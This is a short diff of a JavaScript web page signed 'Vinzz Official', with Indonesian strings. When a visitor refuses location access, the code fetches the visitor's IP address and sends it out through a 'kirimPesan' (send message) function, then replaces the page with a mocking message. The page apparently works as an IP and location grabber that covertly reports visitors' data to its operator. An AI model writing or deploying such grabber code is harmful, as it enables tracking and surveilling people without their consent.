@@ -35,5 +35,5 @@ async function getIP() {
   }, async () => {
     const ip = await getIP();
     await kirimPesan(`IP: ${ip}\nMENOLAK AKSES LOKASI`);
-  });
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
+  }); 
